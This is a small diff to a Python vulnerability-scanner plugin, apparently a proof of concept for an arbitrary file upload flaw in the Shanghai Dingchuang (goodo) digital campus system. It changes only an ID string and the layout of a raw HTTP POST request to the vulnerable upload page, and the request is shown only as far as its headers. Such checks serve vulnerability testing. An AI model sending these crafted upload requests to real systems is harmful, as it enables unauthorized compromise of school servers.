@@ -6,7 +6,7 @@ import re
 import urlparse
 
 class Vuln(ABVuln):
-    vuln_id = 'goodo-edu_0001' # 平台漏洞编号，留空
+    vuln_id = 'Goodo-edu_0001' # 平台漏洞编号，留空
     name = '上海鼎创通用型数字校园系统 任意上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.FILE_UPLOAD # 漏洞类型
@@ -21,7 +21,8 @@ class Vuln(ABVuln):
     product_version = ''  # 漏洞应用版本
 
 def com_pack(state):
-    return '''POST /EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx HTTP/1.1
+    return '''
+POST /EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx HTTP/1.1
 Host: i.goodo.com.cn
 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
